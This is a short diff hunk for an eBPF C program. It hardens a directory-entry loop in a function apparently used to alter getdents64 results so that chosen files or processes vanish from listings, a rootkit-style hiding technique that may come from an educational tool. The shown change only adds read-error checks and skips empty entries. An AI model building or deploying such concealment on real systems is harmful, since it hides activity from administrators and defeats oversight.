@@ -146,12 +146,21 @@ static __always_inline int patch_dirent_if_found(__u32 _,
 	// Get the current directory entry
 	struct linux_dirent64 *dirent =
 		(struct linux_dirent64 *)(data->dirents_buf + data->bpos);
+
+	if (bpf_probe_read(&data->d_reclen, sizeof(data->d_reclen),
+			   &dirent->d_reclen) < 0) {
+		return 1; // Read error, break loop
+	}
+
 	__u64 d_inode = 0;
-	bpf_probe_read(&d_inode, sizeof(d_inode), &dirent->d_ino);
-	if (!d_inode)
-		return 0;
-	bpf_probe_read(&data->d_reclen, sizeof(data->d_reclen),
-		       &dirent->d_reclen);
+	if (bpf_probe_read(&d_inode, sizeof(d_inode), &dirent->d_ino) < 0) {
+		return 1; // Read error, break loop
+	}
+
+	if (!d_inode) {
+		data->bpos += data->d_reclen;
+		return 0; // Skip and continue
+	}
 
 	//Read the name of this entry
 	char dirname[64] = {};
